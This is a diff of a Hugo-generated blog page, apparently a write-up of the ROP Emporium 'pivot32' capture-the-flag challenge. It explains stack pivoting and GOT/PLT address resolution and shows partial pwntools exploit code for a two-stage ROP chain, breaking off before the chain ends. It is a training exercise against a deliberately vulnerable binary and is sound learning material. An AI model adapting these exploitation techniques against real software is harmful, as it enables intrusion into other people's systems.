@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -312,10 +312,10 @@
 <p>During exploitation the ROP gadgets will be executed one after another since they are terminated by a <code>ret</code> instruction. A <code>ret</code> causes the program flow to return to the address that&rsquo;s currently on the top of the stack. For gadget <code>n</code> this will then be gadget <code>n+1</code> &ndash; the ROP chain is getting executed successfully.</p>
 <p>The way the exploitation of <code>pivot32</code> takes place is that it re-uses the gadgets of the binary itself in order to call a function named <code>ret2win()</code> of the enclosed shared object <code>libpivot32.so</code>. This function simply performs a <code>cat</code> on the file <code>flag.txt</code> by invoking <code>system()</code>. Unfortunately, this function isn&rsquo;t imported by <code>pivot32</code>, so it&rsquo;s first required to acquire the address of a known symbol that&rsquo;s being imported by the target binary. The symbol <code>foothold_function()</code> serves exactly for this purpose. By getting the address of this function it&rsquo;s then possible to compute the address of <code>ret2win()</code> using a static offset and call it.</p>
 <p>Luckily <code>pivot32</code> already helps in the exploitation process: It prints the address that has to be pivoted to:</p>
-<pre><code>The Old Gods kindly bestow upon you a place to pivot: 0xf7d2ef10
+<pre tabindex="0"><code>The Old Gods kindly bestow upon you a place to pivot: 0xf7d2ef10
 </code></pre><p>Of course this address changes upon each invocation, so exploitation has to take place dynamically - for example using <code>pwntools</code>. By combining <code>pwntools</code> with my <a href="https://github.com/ps1337/pwntools-r2">pwntools-r2</a> module the exploit can be debugged with <code>radare2</code> on runtime.</p>
 <p>Two inputs are requested using <code>fgets()</code> by the target process:</p>
-<pre><code>pivot by ROP Emporium
+<pre tabindex="0"><code>pivot by ROP Emporium
 32bits
 
 Call ret2win() from libpivot.so
@@ -330,7 +330,7 @@ Exiting
 <h1 id="exploitation">Exploitation</h1>
 <h2 id="eip-control">EIP Control</h2>
 <p>Using the output of <code>ragg2 -r  -P 300</code>, a De Bruijn pattern, it has been determined that <code>EIP</code> gets overwritten after 44 bytes:</p>
-<pre><code>[...]
+<pre tabindex="0"><code>[...]
 Now kindly send your stack smash
 &gt; AAABAACAADAAEAAFAAGAAH[...]
 child stopped with signal 11
@@ -339,7 +339,7 @@ child stopped with signal 11
 44
 </code></pre><h2 id="setting-up-the-stack-pivot">Setting Up The Stack Pivot</h2>
 <p>The address to pivot to is already known. Therefore it&rsquo;s required to set <code>ESP</code> to this specific value. ROP gadgets that are useful for stack pivoting can be listed using <code>ropper</code>:</p>
-<pre><code>ropper --file pivot32 --stack-pivot
+<pre tabindex="0"><code>ropper --file pivot32 --stack-pivot
 [...]
 Gadgets
 =======
@@ -358,14 +358,14 @@ Gadgets
 </ol>
 <p>The <code>pop eax</code> gadget has been found with <code>radare2</code> using <code>/R pop eax</code>, but using <code>pwntools</code> to search for it dynamically using the binary is also a way to do it:</p>
 <img src="/img/binary-rop-stackpivot/snoop_search.gif" width="100%">
-<pre><code>elf = ELF(&quot;./pivot32&quot;)
+<pre tabindex="0"><code>elf = ELF(&#34;./pivot32&#34;)
 elfROP = ROP(elf)
-POP_EAX = p32(elfROP.find_gadget([&quot;pop eax&quot;, &quot;ret&quot;])[0])
+POP_EAX = p32(elfROP.find_gadget([&#34;pop eax&#34;, &#34;ret&#34;])[0])
 </code></pre><p>With all this information gathered, the stack pivoting first stage payload looks like this:</p>
-<pre><code>POP_EAX = p32(elfROP.find_gadget([&quot;pop eax&quot;, &quot;ret&quot;])[0])
+<pre tabindex="0"><code>POP_EAX = p32(elfROP.find_gadget([&#34;pop eax&#34;, &#34;ret&#34;])[0])
 DO_PIVOT = p32(0x080488c2)  # xchg eax esp
 
-STAGE1 = &quot;A&quot; * 44
+STAGE1 = &#34;A&#34; * 44
 STAGE1 += POP_EAX  # Load following pivot_addr in EAX
 STAGE1 += pivot_addr
 STAGE1 += DO_PIVOT  # Exchange EAX and ESP
@@ -375,17 +375,17 @@ STAGE1 += DO_PIVOT  # Exchange EAX and ESP
 <p>Upon calling the dynamically linked function <code>foothold_function()</code> from <code>libpivot32.so</code> for the first time, e.g. at process launch, the address of this function has to be determined first. To avoid doing this every time, the result of the resolution will be saved in the GOT (Global Offset Table) after the first call. Upon calling the function a second time, the existing GOT entry will be used. The address of the GOT entry for a specific function can be determined using <code>radare2</code> using <code>?v reloc.foothold_function</code>.</p>
 <p>Initially the GOT will point to an entry in the PLT (Procedure Linkage Table). This entry in turn calls the dynamic linker that does the actual address resolution. The address of the PLT entry for a specific function can be read using <code>radare2</code> with <code>?v sym.imp.foothold_function</code>.</p>
 <p>Or you use <code>pwntools</code>:</p>
-<pre><code>elf = ELF(&quot;./pivot32&quot;)
-FOOTHOLD_PLT = p32(elf.plt[&quot;foothold_function&quot;])
-FOOTHOLD_GOT = p32(elf.got[&quot;foothold_function&quot;])
+<pre tabindex="0"><code>elf = ELF(&#34;./pivot32&#34;)
+FOOTHOLD_PLT = p32(elf.plt[&#34;foothold_function&#34;])
+FOOTHOLD_GOT = p32(elf.got[&#34;foothold_function&#34;])
 </code></pre><p>As long as the binary is not compiled with PIE, the aspects described in this section above are valid.</p>
 <p>Please note that before being able to get the address of <code>foothold_function()</code>, it has to be called first at least once. This populates the entry in the GOT which can then be used by the ROP chain.</p>
 <h3 id="second-stage-payload">Second Stage Payload</h3>
 <p>The first thing the second stage payload has to perform is to call <code>foothold_function()</code> once. After that, it can read the GOT entry of this function and determine its real address. To calculate the address of <code>ret2win()</code> it&rsquo;s then required to know the offset between these two functions in the shared library. The easiest way to do this is to calculate this using <code>pwntools</code>:</p>
-<pre><code>FOOTHOLD_WIN_DISTANCE = p32(lib.symbols[&quot;ret2win&quot;] -
-                            lib.symbols[&quot;foothold_function&quot;])
+<pre tabindex="0"><code>FOOTHOLD_WIN_DISTANCE = p32(lib.symbols[&#34;ret2win&#34;] -
+                            lib.symbols[&#34;foothold_function&#34;])
 </code></pre><p>This offset has then to be added to the determined address of <code>foothold_function()</code> to get the address of <code>ret2win()</code>. Calling the resulting address prints the flag. The ROP chain therefore looks like this:</p>
-<pre><code>STAGE2 = &quot;&quot;
+<pre tabindex="0"><code>STAGE2 = &#34;&#34;
 STAGE2 += FOOTHOLD_PLT  # Cause foothold resolution -&gt; Populates GOT
 STAGE2 += POP_EAX  # Load the following address into eax
 STAGE2 += FOOTHOLD_GOT
